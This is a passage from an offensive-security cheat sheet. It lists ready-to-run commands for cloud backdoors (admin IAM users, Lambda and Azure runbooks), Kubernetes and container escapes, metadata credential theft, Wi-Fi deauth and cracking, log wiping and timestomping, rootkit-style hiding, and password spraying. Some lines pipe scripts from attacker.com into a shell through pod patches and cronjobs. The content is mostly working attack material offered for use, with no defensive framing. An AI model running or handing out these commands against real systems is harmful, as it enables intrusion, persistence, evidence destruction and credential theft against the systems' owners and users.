
run iam__backdoor_users
# Use Case: IAM user backdooring
# Explanation: Creates backdoor IAM users

run s3__bucket_finder
# Use Case: S3 bucket discovery and analysis
# Explanation: Finds and analyzes S3 buckets

AWS Privilege Escalation
bash
# IAM Privilege Escalation Techniques
aws iam create-user --user-name backdoor-user
# Use Case: Creating backdoor users
# Explanation: Creates new IAM user for persistence

aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Use Case: Granting administrative privileges
# Explanation: Attaches administrator policy to user

aws iam create-access-key --user-name backdoor-user
# Use Case: Creating access keys
# Explanation: Generates access keys for programmatic access

aws iam update-assume-role-policy --role-name target-role --policy-document file://trust-policy.json
# Use Case: Role trust policy modification
# Explanation: Modifies role trust relationships

# Lambda Backdoors
aws lambda create-function --function-name BackdoorFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip
# Use Case: Lambda function backdoor
# Explanation: Creates malicious Lambda function

aws events put-rule --name "DailyTrigger" --schedule-expression "rate(1 day)"
aws events put-targets --rule "DailyTrigger" --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:BackdoorFunction"
# Use Case: Scheduled Lambda execution
# Explanation: Triggers Lambda function on schedule

AWS Persistence Techniques
bash
# EC2 Instance Backdooring
aws ec2 run-instances --image-id ami-12345678 --count 1 --instance-type t2.micro --key-name backdoor-key --security-group-ids sg-12345678 --subnet-id subnet-12345678 --user-data file://userdata.sh
# Use Case: Malicious EC2 instance creation
# Explanation: Creates EC2 instance with backdoor user data

# CloudTrail Log Manipulation
aws cloudtrail stop-logging --name trail-name
# Use Case: Disabling CloudTrail logging
# Explanation: Stops CloudTrail logging to evade detection

aws cloudtrail delete-trail --name trail-name
# Use Case: Removing CloudTrail trails
# Explanation: Deletes CloudTrail configuration

# IAM Role Persistence
aws iam create-role --role-name BackdoorRole --assume-role-policy-document file://trust-policy.json
aws iam attach-role-policy --role-name BackdoorRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# Use Case: Backdoor role creation
# Explanation: Creates persistent IAM roles with high privileges

S3 Bucket Exploitation
bash
# S3 Bucket Enumeration
aws s3 ls s3://target-bucket/ --no-sign-request
# Use Case: Public bucket discovery
# Explanation: Lists contents of publicly accessible buckets

aws s3 sync s3://target-bucket/ ./local-folder/ --no-sign-request
# Use Case: S3 bucket data exfiltration
# Explanation: Downloads entire bucket contents

aws s3 cp s3://target-bucket/secret.txt ./
# Use Case: Specific file download
# Explanation: Downloads individual files from S3

# S3 Bucket Manipulation
aws s3 cp malicious-file.txt s3://target-bucket/
# Use Case: S3 bucket upload
# Explanation: Uploads files to writable buckets

aws s3api put-bucket-acl --bucket target-bucket --acl public-read-write
# Use Case: S3 bucket ACL modification
# Explanation: Changes bucket permissions to public

11.2 Azure AD Attacks

Azure AD Reconnaissance
powershell
# Azure AD Module Commands
Connect-AzureAD
# Use Case: Azure AD connection
# Explanation: Connects to Azure Active Directory

Get-AzureADUser -All $true | Select-Object DisplayName, UserPrincipalName
# Use Case: User enumeration
# Explanation: Lists all Azure AD users

Get-AzureADDirectoryRole | ForEach-Object {Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId}
# Use Case: Role membership enumeration
# Explanation: Lists members of Azure AD roles

Get-AzureADApplication -All $true
Get-AzureADServicePrincipal -All $true
# Use Case: Application and service principal enumeration
# Explanation: Lists Azure AD applications and service principals

# MicroBurst Azure Exploitation Framework
Get-AzurePasswords -Verbose
# Use Case: Azure credential harvesting
# Explanation: Attempts to extract passwords from Azure

Invoke-EnumerateAzureBlobs -Base company
# Use Case: Azure storage enumeration
# Explanation: Discovers Azure storage accounts and containers

Get-AzureDomainInfo
# Use Case: Azure domain information gathering
# Explanation: Collects Azure AD domain information

Azure Privilege Escalation
powershell
# Azure Role Assignment
Add-AzureADRoleMember -ObjectId "role-id" -RefObjectId "user-id"
# Use Case: Azure role assignment
# Explanation: Adds users to Azure AD roles

New-AzureADServicePrincipal -DisplayName "BackdoorApp"
# Use Case: Service principal creation
# Explanation: Creates backdoor service principals

# Runbook Persistence
Import-AzAutomationRunbook -Name "BackdoorRunbook" -Path "C:\backdoor.ps1" -AutomationAccountName "Account" -ResourceGroupName "RG" -Type PowerShell
# Use Case: Automation runbook persistence
# Explanation: Creates malicious automation runbooks

Publish-AzAutomationRunbook -AutomationAccountName "Account" -ResourceGroupName "RG" -Name "BackdoorRunbook"
# Use Case: Runbook publication
# Explanation: Publishes runbook for execution

# Function App Backdoors
az functionapp create --name BackdoorFunction --storage-account mystorageaccount --resource-group myResourceGroup --consumption-plan-location westus
# Use Case: Azure Function backdoor
# Explanation: Creates malicious Azure Functions

Azure Storage Exploitation
bash
# Azure Storage Account Enumeration
az storage account list --resource-group myResourceGroup
# Use Case: Storage account discovery
# Explanation: Lists Azure storage accounts

az storage container list --account-name mystorageaccount --account-key mykey
# Use Case: Container enumeration
# Explanation: Lists containers in storage account

# Storage Account Access
az storage blob download --account-name mystorageaccount --container-name mycontainer --name myblob --file ./localfile
# Use Case: Blob storage access
# Explanation: Downloads files from Azure blob storage

az storage blob upload --account-name mystorageaccount --container-name mycontainer --name myblob --type block --file ./localfile
# Use Case: Blob storage upload
# Explanation: Uploads files to Azure blob storage

11.3 Kubernetes Security

Kubernetes Reconnaissance
bash
# Basic Kubernetes Enumeration
kubectl get pods --all-namespaces
# Use Case: Pod discovery
# Explanation: Lists all pods in all namespaces

kubectl get secrets --all-namespaces
# Use Case: Secret enumeration
# Explanation: Lists Kubernetes secrets

kubectl get configmaps --all-namespaces
# Use Case: ConfigMap enumeration
# Explanation: Lists configuration maps

kubectl get services --all-namespaces
# Use Case: Service discovery
# Explanation: Lists Kubernetes services

kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces
kubectl get clusterroles
kubectl get clusterrolebindings
# Use Case: RBAC enumeration
# Explanation: Lists roles and role bindings

# Advanced Kubernetes Enumeration
kubectl auth can-i --list
# Use Case: Permission enumeration
# Explanation: Shows current user permissions

kubectl get nodes -o yaml
# Use Case: Node information
# Explanation: Gets detailed node information

Kubernetes Privilege Escalation
bash
# Privilege Escalation Techniques
kubectl create rolebinding privileged-role-binding --user=system:serviceaccount:default:default --clusterrole=cluster-admin
# Use Case: Service account privilege escalation
# Explanation: Grants cluster-admin to service account

kubectl patch pod my-pod -p '{"spec":{"containers":[{"name":"my-container","image":"alpine","command":["/bin/sh"],"args":["-c","curl http://attacker.com/shell.sh | sh"]}]}}'
# Use Case: Pod command injection
# Explanation: Modifies pod specifications for code execution

kubectl exec -it my-pod -- /bin/bash
# Use Case: Pod command execution
# Explanation: Executes commands in running pods

# Kubernetes Backdoors
kubectl create secret generic backdoor-secret --from-literal=token=supersecret
# Use Case: Secret creation for persistence
# Explanation: Creates secrets for storing backdoor data

kubectl create cronjob backdoor-job --image=alpine --schedule="*/5 * * * *" -- /bin/sh -c "curl http://attacker.com/payload.sh | sh"
# Use Case: CronJob persistence
# Explanation: Creates scheduled jobs for persistence

Container Escape Techniques
bash
# Privileged Container Escape
docker run --privileged -v /:/host -it alpine chroot /host /bin/sh
# Use Case: Privileged container escape
# Explanation: Escapes to host from privileged container

# Docker Socket Escape
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
# Use Case: Docker socket escape
# Explanation: Uses Docker socket to control host Docker daemon

# Capabilities-based Escape
docker run --cap-add=ALL -v /:/host -it alpine chroot /host /bin/sh
# Use Case: Capability-based escape
# Explanation: Uses container capabilities for host access

# Kubernetes Node Compromise
kubectl debug node/node-name -it --image=alpine
# Use Case: Node debugging escape
# Explanation: Uses Kubernetes node debugging for host access

11.4 Cloud Metadata API Exploitation

AWS Instance Metadata
bash
# EC2 Metadata Enumeration
curl http://169.254.169.254/latest/meta-data/
# Use Case: Instance metadata discovery
# Explanation: Lists available metadata categories

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Use Case: IAM role discovery
# Explanation: Lists available IAM roles

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# Use Case: Temporary credential retrieval
# Explanation: Gets temporary security credentials

curl http://169.254.169.254/latest/user-data
# Use Case: User data retrieval
# Explanation: Gets instance user data

# Advanced Metadata Attacks
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
# Use Case: IMDSv2 token-based access
# Explanation: Uses IMDSv2 tokens for metadata access

Azure Instance Metadata
bash
# Azure Metadata Service
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Use Case: Azure instance metadata
# Explanation: Gets Azure VM instance metadata

curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"
# Use Case: Managed identity token retrieval
# Explanation: Gets access tokens for managed identities

Google Cloud Metadata
bash
# GCP Metadata Service
curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"
# Use Case: GCP instance metadata
# Explanation: Lists GCP metadata endpoints

curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Use Case: Service account token retrieval
# Explanation: Gets access tokens for service accounts

12.MOBILE & WIRELESS

12.1 Wireless Attacks

Aircrack-ng Suite
bash
# Wireless Interface Setup
airmon-ng start wlan0
# Use Case: Monitor mode activation
# Explanation: Puts wireless interface in monitor mode

airmon-ng check kill
# Use Case: Process killing
# Explanation: Stops processes that interfere with monitoring

# Wireless Network Discovery
airodump-ng wlan0mon
# Use Case: Wireless network reconnaissance
# Explanation: Discovers nearby wireless networks

airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Use Case: Targeted network capture
# Explanation: Captures packets from specific network

# WPA/WPA2 Handshake Capture
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Use Case: Deauthentication attack
# Explanation: Forces clients to reconnect and capture handshake

# WPA/WPA2 Cracking
aircrack-ng -w wordlist.txt capture-01.cap
# Use Case: Password cracking
# Explanation: Cracks WPA/WPA2 passwords from captured handshake

# WEP Cracking
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
# Use Case: WEP encryption cracking
# Explanation: Cracks WEP keys from captured packets

WPA3 & Advanced Wireless Attacks
bash
# PMKID Attack with hcxdumptool
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Use Case: PMKID capture without deauth
# Explanation: Captures PMKID for offline cracking

hcxpcaptool -z hashes.txt capture.pcapng
# Use Case: Hash extraction
# Explanation: Extracts hashes from capture file

hashcat -m 22000 hashes.txt wordlist.txt
# Use Case: PMKID hash cracking
# Explanation: Cracks PMKID hashes with hashcat

# Evil Twin Attack
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "Free WiFi" -c 6 wlan0mon
# Use Case: Rogue access point
# Explanation: Creates fake access point

# KARMA Attack
airbase-ng -P -C 30 -c 6 --essid "KARMA" wlan0mon
# Use Case: Client probing attacks
# Explanation: Responds to all probe requests

BetterCAP Wireless Attacks
bash
# WiFi Reconnaissance
bettercap -iface wlan0
wifi.recon on
wifi.show
# Use Case: Wireless network discovery
# Explanation: Discovers and displays wireless networks

# WiFi Deauthentication
set wifi.deauth.essid TargetNetwork
wifi.deauth
# Use Case: Targeted deauthentication
# Explanation: Deauthenticates clients from specific network

# Rogue AP with BetterCAP
set wifi.ap.ssid FreeWiFi
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6
wifi.recon on
wifi.ap
# Use Case: Rogue access point creation
# Explanation: Creates fake access point for attacks

12.2 Mobile Application Testing

Objection - Runtime Mobile Assessment
bash
# iOS Application Testing
objection -g com.app.name explore
# Use Case: iOS app runtime analysis
# Explanation: Injects into iOS application for testing

ios keychain dump
# Use Case: iOS keychain extraction
# Explanation: Dumps iOS keychain entries

ios nsurlcredentialstorage dump
# Use Case: Credential storage dumping
# Explanation: Extracts stored credentials

ios ui screenshot /tmp/screen.png
# Use Case: Screenshot capture
# Explanation: Takes screenshots of running app

# Android Application Testing
objection -g com.android.app explore
# Use Case: Android app runtime analysis
# Explanation: Injects into Android application

android keystore list
# Use Case: Android keystore enumeration
# Explanation: Lists Android keystore entries

android hooking list activities
# Use Case: Activity enumeration
# Explanation: Lists Android activities

android hooking watch class_method com.app.Class.method --dump-args --dump-return
# Use Case: Method hooking
# Explanation: Monitors method calls and parameters

Frida - Dynamic Instrumentation
javascript
// Frida Script Examples
// SSL Pinning Bypass
Java.perform(function() {
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    TrustManager.checkServerTrusted.implementation = function(chain, authType) {
        console.log("SSL Bypass: " + chain);
    };
});

// Crypto Hooking
Java.perform(function() {
    var CryptoClass = Java.use("com.example.Crypto");
    CryptoClass.encrypt.implementation = function(data) {
        console.log("Encrypting: " + data);
        var result = this.encrypt(data);
        console.log("Result: " + result);
        return result;
    };
});

// Root Detection Bypass
Java.perform(function() {
    var RootCheck = Java.use("com.example.RootCheck");
    RootCheck.isRooted.implementation = function() {
        console.log("Root check bypassed");
        return false;
    };
});

// Frida Usage
frida -U -f com.app.name -l script.js --no-pause
# Use Case: App instrumentation
# Explanation: Injects Frida scripts into running app

MobSF - Mobile Security Framework
bash
# Static Analysis
python3 manage.py runserver 0.0.0.0:8000
# Use Case: Web-based mobile app analysis
# Explanation: Runs MobSF web interface for static analysis

# Dynamic Analysis Setup
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
# Use Case: Containerized MobSF deployment
# Explanation: Runs MobSF in Docker container

# API Usage
curl -X POST -F "file=@app.apk" http://localhost:8000/api/v1/upload
curl -X GET "http://localhost:8000/api/v1/report?hash=APP_HASH"
# Use Case: Automated mobile app testing
# Explanation: Uses MobSF API for integration

APKTool & Reverse Engineering
bash
# APK Decompilation
apktool d app.apk -o decompiled/
# Use Case: APK reverse engineering
# Explanation: Decompiles APK to smali code

apktool b decompiled/ -o modified.apk
# Use Case: APK repackaging
# Explanation: Rebuilds modified APK

# JADX Decompilation
jadx -d decompiled/ app.apk
# Use Case: Java source code recovery
# Explanation: Decompiles APK to Java source

# Signing Modified APK
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore modified.apk alias_name
# Use Case: APK signing for installation
# Explanation: Creates certificate and signs APK

12.3 Bluetooth Attacks

Bluetooth Reconnaissance
bash
# Bluetooth Device Discovery
hcitool scan
# Use Case: Bluetooth device discovery
# Explanation: Scans for nearby Bluetooth devices

hcitool inq
# Use Case: Extended device discovery
# Explanation: Performs extended device inquiry

bluetoothctl
# Use Case: Bluetooth control interface
# Explanation: Interactive Bluetooth management

# Bluetooth Service Discovery
sdptool browse AA:BB:CC:DD:EE:FF
# Use Case: Service enumeration
# Explanation: Lists services on Bluetooth device

# Bluetooth Sniffing
ubertooth-btle -f -r capture.pcap
# Use Case: Bluetooth Low Energy sniffing
# Explanation: Captures BLE communications

hcidump -Xt
# Use Case: HCI packet capture
# Explanation: Captures Host Controller Interface packets

Bluetooth Exploitation
bash
# BlueBorne Attacks
python blueborne.py -t AA:BB:CC:DD:EE:FF
# Use Case: BlueBorne vulnerability exploitation
# Explanation: Exploits BlueBorne vulnerabilities

# L2CAP Attacks
l2ping -s 1000 -f AA:BB:CC:DD:EE:FF
# Use Case: L2CAP ping flood
# Explanation: Sends L2CAP ping packets for testing

# Bluetooth PIN Cracking
btcrack AA:BB:CC:DD:EE:FF capture.cap wordlist.txt
# Use Case: Bluetooth PIN cracking
# Explanation: Attempts to crack Bluetooth PINs

# GATT Exploitation
gatttool -b AA:BB:CC:DD:EE:FF -I
connect
char-read-hnd 0x000c
# Use Case: GATT service interaction
# Explanation: Interacts with GATT services and characteristics

13.ANTI-FORENSICS

13.1 Log Manipulation

Linux Log Cleaning
bash
# Clear Specific Log Files
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages
# Use Case: Basic log clearing
# Explanation: Empties log files to remove evidence

# Selective Log Entry Removal
sed -i '/10.10.10.10/d' /var/log/apache2/access.log
sed -i '/username/d' /var/log/auth.log
# Use Case: Targeted log entry removal
# Explanation: Removes specific entries while keeping others

# Log Rotation Manipulation
logrotate -f /etc/logrotate.conf
# Use Case: Forced log rotation
# Explanation: Triggers log rotation to archive current logs

# Journald Log Cleaning
journalctl --vacuum-time=1s
journalctl --vacuum-size=1M
# Use Case: Systemd journal cleaning
# Explanation: Reduces journal size or removes old entries

journalctl --flush
# Use Case: Journal flushing
# Explanation: Forces journal to write to disk

# Comprehensive Log Cleaning Script
for log in /var/log/*.log; do echo "" > $log; done
find /var/log -name "*.log" -exec sh -c 'echo "" > {}' \;
# Use Case: Bulk log cleaning
# Explanation: Clears all log files in /var/log

Windows Log Manipulation
powershell
# Event Log Clearing
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# Use Case: Windows event log clearing
# Explanation: Clears major Windows event logs

Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
# Use Case: PowerShell event log clearing
# Explanation: Clears all event logs using PowerShell

# Selective Event Removal
wevtutil epl Security backup.evtx "/q:*[System[(EventID=4624)]]"
wevtutil cl Security
wevtutil al backup.evtx
# Use Case: Selective event backup and restore
# Explanation: Backups specific events, clears log, restores backup

# Event Log Service Manipulation
net stop eventlog
net start eventlog
# Use Case: Event log service restart
# Explanation: Restarts event log service

# WEF Subscription Removal
wecutil ss
wecutil ds SubscriptionName
# Use Case: Windows Event Forwarding cleanup
# Explanation: Lists and removes event subscriptions

Web Server Log Cleaning
bash
# Apache Log Cleaning
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log
# Use Case: Apache log clearing
# Explanation: Clears Apache access and error logs

# Nginx Log Cleaning
echo "" > /var/log/nginx/access.log
echo "" > /var/log/nginx/error.log
# Use Case: Nginx log clearing
# Explanation: Clears Nginx access and error logs

# IIS Log Cleaning
del C:\inetpub\logs\LogFiles\W3SVC1\*.log
# Use Case: IIS log deletion
# Explanation: Deletes IIS log files

13.2 File Timestamp Manipulation

Linux Timestamp Manipulation
bash
# Timestamp Modification
touch -r /bin/ls malicious_file
# Use Case: Reference file timestamp copying
# Explanation: Sets timestamp to match legitimate file

touch -t 202001010000 malicious_file
# Use Case: Specific timestamp setting
# Explanation: Sets exact timestamp (YYYYMMDDhhmm)

# Timestamp Backdating
find /tmp -name "malicious*" -exec touch -t 202001010000 {} \;
# Use Case: Bulk timestamp modification
# Explanation: Changes timestamps for multiple files

# Extended Attribute Manipulation
setfattr -n user.comment -v "legitimate file" malicious_file
# Use Case: Metadata manipulation
# Explanation: Adds fake metadata to files

# Inode Time Manipulation
debugfs -w /dev/sda1 -R "set_inode_field /path/to/file i_atime 202001010000"
# Use Case: Low-level timestamp manipulation
# Explanation: Direct inode modification (requires unmounted FS)

Windows Timestamp Manipulation
powershell
# File Timestamp Modification
(Get-Item malicious.exe).CreationTime = '01/01/2020 00:00:00'
(Get-Item malicious.exe).LastWriteTime = '01/01/2020 00:00:00'
(Get-Item malicious.exe).LastAccessTime = '01/01/2020 00:00:00'
# Use Case: PowerShell timestamp modification
# Explanation: Changes file timestamps using PowerShell

# CMD Timestamp Modification
copy /b malicious.exe +,,
# Use Case: CMD timestamp update
# Explanation: Updates file timestamp to current time

# Timestomp-like Functionality
$file = Get-Item "malicious.exe"
$file.CreationTime = "01/01/2020"
$file.LastWriteTime = "01/01/2020"
$file.LastAccessTime = "01/01/2020"
# Use Case: Comprehensive timestamp manipulation
# Explanation: Modifies all timestamp attributes

Registry Timestamp Manipulation
cmd
# Registry Key Timestamp Modification
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Malicious /t REG_SZ /d "C:\malware.exe" /f
# Use Case: Registry modification with current timestamp
# Explanation: Adding registry entries updates timestamps

# Offline Registry Editing
reg load HKLM\Temp C:\Windows\System32\config\SOFTWARE
reg delete "HKLM\Temp\Microsoft\Windows\CurrentVersion\Run" /v Malicious /f
reg unload HKLM\Temp
# Use Case: Offline registry manipulation
# Explanation: Modifies registry hives while offline

13.3 Artifact Removal

Browser History Cleaning
bash
# Chrome History Cleaning
rm -rf ~/.config/google-chrome/Default/History
rm -rf ~/.config/google-chrome/Default/History-journal
# Use Case: Chrome browser history removal
# Explanation: Deletes Chrome browsing history

# Firefox History Cleaning
rm -rf ~/.mozilla/firefox/*.default/places.sqlite
rm -rf ~/.mozilla/firefox/*.default/places.sqlite-wal
# Use Case: Firefox browser history removal
# Explanation: Deletes Firefox browsing history

# Comprehensive Browser Cleaning
find ~ -name "History" -delete
find ~ -name "places.sqlite" -delete
find ~ -name "Cookies" -delete
# Use Case: Multi-browser artifact removal
# Explanation: Removes artifacts from all browsers

System Artifact Removal
bash
# Bash History Cleaning
echo "" > ~/.bash_history
history -c
# Use Case: Command history removal
# Explanation: Clears bash command history

# SSH Key Removal
rm -rf ~/.ssh/known_hosts
rm -rf ~/.ssh/authorized_keys
# Use Case: SSH artifact cleanup
# Explanation: Removes SSH connection artifacts

# Temporary File Cleaning
rm -rf /tmp/malicious*
rm -rf /var/tmp/suspicious*
# Use Case: Temporary file removal
# Explanation: Cleans up temporary directories

# Download History
rm -rf ~/.cache/thumbnails/*
rm -rf ~/.local/share/Trash/*
# Use Case: System cache and trash cleaning
# Explanation: Removes cached thumbnails and trash contents

Windows Artifact Removal
powershell
# Prefetch File Cleaning
Remove-Item C:\Windows\Prefetch\*.pf -Force
# Use Case: Prefetch file removal
# Explanation: Deletes application prefetch files

# Jump List Cleaning
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
# Use Case: Jump list removal
# Explanation: Clears Windows jump lists

# Thumbnail Cache Cleaning
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force
# Use Case: Thumbnail cache removal
# Explanation: Deletes thumbnail cache databases

# Recent Documents Cleaning
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force
# Use Case: Recent documents registry cleanup
# Explanation: Removes recent documents from registry

13.4 Memory Forensics Evasion

Process Hiding Techniques
bash
# LD_PRELOAD Hooking
echo "/tmp/malicious_lib.so" > /etc/ld.so.preload
# Use Case: Library preloading for hiding
# Explanation: Hooks system calls to hide processes

# Mount Namespace Hiding
unshare -m --propagation private
# Use Case: Mount namespace isolation
# Explanation: Creates private mount namespace

# Process Name Obfuscation
cp /bin/bash /tmp/.hidden_process
exec -a "[kworker/0:0]" /tmp/.hidden_process
# Use Case: Process name spoofing
# Explanation: Masquerades as legitimate system process

Rootkit Techniques
bash
# Loadable Kernel Module (LKM) Hiding
insmod rootkit.ko
# Use Case: Kernel-level hiding
# Explanation: Loads kernel module for advanced hiding

# System Call Table Hooking
# Custom kernel module that hooks sys_getdents64
# Use Case: File and process hiding
# Explanation: Hooks system calls to hide artifacts

# Network Connection Hiding
# Hook sys_netstat or similar calls
# Use Case: Network connection concealment
# Explanation: Hides network connections from tools

Anti-Forensic Tools
bash
# BleachBit System Cleaning
bleachbit --preset
bleachbit --clean bash.history system.cache system.tmp
# Use Case: Comprehensive system cleaning
# Explanation: Uses BleachBit for artifact removal

# CCleaner (Windows)
CCleaner.exe /AUTO
# Use Case: Windows system cleaning
# Explanation: Uses CCleaner for automated cleaning

# SDelete Secure Deletion
sdelete -p 3 -s C:\sensitive-file.txt
# Use Case: Secure file deletion
# Explanation: Overwrites files before deletion

14.PASSWORD ATTACKS

14.1 Hash Cracking

Hashcat - Advanced Password Cracking
bash
# NTLM Hash Cracking
hashcat -m 1000 hashes.txt -a 0 rockyou.txt -r rules/best64.rule -O -w 4 --force
# Use Case: Windows password cracking
# Explanation: Cracks NTLM hashes with wordlist and rules

hashcat -m 1000 hashes.txt -a 3 ?d?d?d?d?d?d?d?d --increment
# Use Case: NTLM brute force
# Explanation: Brute forces NTLM hashes with digits

hashcat -m 1000 hashes.txt -a 6 password?d?d?d -1 ?l?u?d
# Use Case: Hybrid attack
# Explanation: Combines wordlist with mask patterns

# WPA/WPA2 Handshake Cracking
hashcat -m 22000 capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# Use Case: WPA password cracking
# Explanation: Cracks WPA handshakes with brute force

hashcat -m 22000 capture.hc22000 wordlist.txt -r rules/InsidePro-PasswordsPro.rule
# Use Case: WPA with wordlist and rules
# Explanation: Uses wordlist with rules for WPA cracking

# Kerberos Ticket Cracking
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
# Use Case: Kerberoasting hash cracking
# Explanation: Cracks Kerberos service account hashes

hashcat -m 18200 asrep_hashes.txt rockyou.txt
# Use Case: AS-REP roasting hash cracking
# Explanation: Cracks AS-REP response hashes

# Advanced Hashcat Options
hashcat -m 0 hashes.txt -r rules/InsidePro-PasswordsPro.rule wordlist.txt --potfile-disable --outfile-format 2
# Use Case: Custom output formatting
# Explanation: Disables potfile and customizes output

hashcat -m 1000 hashes.txt --show
# Use Case: Results display
# Explanation: Shows cracked hashes from potfile

John the Ripper - Password Cracking
bash
# Multi-Format Hash Cracking
john --format=raw-md5 hashes.txt --wordlist=wordlist.txt --rules
# Use Case: MD5 hash cracking
# Explanation: Cracks MD5 hashes with rules

john --format=netntlmv2 hashes.txt --fork=4
# Use Case: NTLMv2 hash cracking
# Explanation: Cracks NTLMv2 hashes with multiple forks

john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
# Use Case: Kerberos ticket cracking
# Explanation: Cracks Kerberos TGS tickets

# Incremental and Mask Attacks
john --incremental=Digits hashes.txt
# Use Case: Digit-based brute force
# Explanation: Uses incremental mode for digits

john --mask=?l?l?l?l?l?l?l?l hashes.txt
# Use Case: Custom mask attacks
# Explanation: Uses mask for specific pattern cracking

# Session Management
john --restore=session_name
# Use Case: Session restoration
# Explanation: Restores interrupted cracking sessions

john --status=session_name
# Use Case: Session status checking
# Explanation: Shows progress of cracking session

Rainbow Table Attacks
bash
# Rainbow Table Generation
rtgen md5 loweralpha 1 7 0 3800 33554432 0
# Use Case: Rainbow table creation
# Explanation: Generates rainbow tables for specific parameters

# Rainbow Table Usage
rcrack . -l hashes.txt
# Use Case: Rainbow table cracking
# Explanation: Uses rainbow tables for fast hash cracking

rtsort .
# Use Case: Rainbow table sorting
# Explanation: Sorts rainbow tables for efficient usage

14.2 Password Spraying

Domain Password Spraying
bash
# Kerbrute for Kerberos Spraying
kerbrute passwordspray -d domain.local users.txt Password123
# Use Case: Kerberos password spraying
# Explanation: Sprays passwords against Kerberos service

kerbrute bruteuser -d domain.local passwords.txt username
# Use Case: User-specific brute forcing
# Explanation: Brute forces specific user account

# CrackMapExec SMB Spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2023!' --continue-on-success
# Use Case: SMB password spraying
# Explanation: Sprays passwords against SMB service

# SprayingToolkit
python3 sprayer.py -smb -targets targets.txt -users users.txt -passwords passwords.txt -threads 5
# Use Case: Multi-protocol spraying
# Explanation: Sprays passwords across multiple protocols

Web Application Password Spraying
bash
# Hydra for Web Spraying
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Use Case: Web form password spraying
# Explanation: Sprays passwords against web login forms

hydra -l admin -P passwords.txt 10.10.10.10 http-get /admin
# Use Case: HTTP basic auth spraying
# Explanation: Sprays against HTTP basic authentication

# Custom Python Spraying Script
python3 sprayer.py --url https://target.com/login --users users.txt --passwords passwords.txt --delay 10
# Use Case: Custom spraying with rate limiting
# Explanation: Implements custom spraying with delays

O365 & Cloud Service Spraying
bash
# MSOLSpray for O365
python3 MSOLSpray.py --url https://login.microsoft.com --users users.txt --passwords passwords.txt
# Use Case: Office 365 password spraying
# Explanation: Sprays passwords against O365 services

# o365spray for Office 365
python3 o365spray.py --spray -u users.txt -p 'Company123!' --count 1 --lockout 1
# Use Case: O365 spraying with lockout awareness
# Explanation: Sprays with lockout threshold monitoring

# Okta API Spraying
python3 okta_spray.py -t target.okta.com -u users.txt -p passwords.txt
# Use Case: Okta service spraying
# Explanation: Sprays passwords against Okta authentication

14.3 Brute Force Attacks

Online Brute Force Attacks
bash
# SSH Brute Force
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V -f
# Use Case: SSH service brute forcing
# Explanation: Brute forces SSH credentials

ncrack -U users.txt -P passwords.txt ssh://10.10.10.10:22
# Use Case: Alternative SSH brute forcing
# Explanation: Uses ncrack for SSH brute force

# RDP Brute Force
hydra -l administrator -P passwords.txt rdp://10.10.10.10
# Use Case: RDP service brute forcing
# Explanation: Brute forces Remote Desktop credentials

crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt
# Use Case: RDP brute force with crowbar
# Explanation: Uses crowbar tool for RDP attacks

# FTP Brute Force
hydra -L users.txt -P passwords.txt ftp://10.10.10.10
# Use Case: FTP service brute forcing
# Explanation: Brute forces FTP credentials

nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
# Use Case: Nmap FTP brute force script
# Explanation: Uses NSE script for FTP brute force

Offline Brute Force Attacks
bash
# ZIP File Password Cracking
fcrackzip -u -D -p passwords.txt archive.zip
# Use Case: ZIP archive password cracking
# Explanation: Brute forces ZIP file passwords

john --format=zip hashes.txt
# Use Case: John for ZIP hashes
# Explanation: Uses John for ZIP hash cracking

# PDF Password Cracking
pdf2john.pl document.pdf > pdf_hash.txt
john pdf_hash.txt
# Use Case: PDF password cracking
